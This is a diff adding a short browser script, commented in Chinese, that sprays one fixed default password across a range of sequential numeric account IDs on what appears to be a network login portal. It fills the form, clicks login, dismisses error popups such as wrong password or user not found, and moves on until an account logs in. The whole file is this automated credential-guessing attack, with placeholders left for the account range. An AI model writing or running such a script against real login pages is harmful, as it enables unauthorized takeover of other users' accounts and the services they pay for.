@@ -1,0 +1,55 @@
+(function() {
+    'use strict';
+
+    var pwd = '默认固定密码'; // 替换为您的固定密码
+    var startAccountNum = 账号起; // 起始账号范围
+    var endAccountNum = 账号末; // 结束账号范围
+
+    var accounts = [];
+    for (var i = startAccountNum; i <= endAccountNum; i++) {
+        accounts.push({ user: i.toString(), pwd: pwd });
+    }
+
+    var currentAccountIndex = 0;
+
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function tryLogin(account) {
+        if (document.querySelector("#logout") !== null) {
+            return; 
+        }
+
+        document.querySelector("#username").value = account.user;
+        document.querySelector("#password").value = account.pwd;
+        document.querySelector("#login").click();
+
+        await delay(500);
+
+        var msgSelector = ".layui-layer-content";
+        var msg = document.querySelector(msgSelector);
+        if (msg) {
+            var messageText = msg.textContent;
+            var confirmBtnSelector = ".layui-layer-btn0";
+            var confirmBtn = document.querySelector(confirmBtnSelector);
+
+           if (confirmBtn && (messageText.includes("已经在线了") || 
+                               messageText.includes("帐号或密码错误") || 
+                               messageText.includes("用户被禁用") || 
+                               messageText.includes("用户已欠费") ||
+                               messageText.includes("找不到符合条件的产品") ||
+                               messageText.includes("用户不存在"))) {
+                confirmBtn.click();
+                await delay(1000);
+
+                currentAccountIndex++;
+                if (currentAccountIndex < accounts.length) {
+                    tryLogin(accounts[currentAccountIndex]);
+                }
+            }
+        }
+    }
+
+    tryLogin(accounts[currentAccountIndex]);
+})();
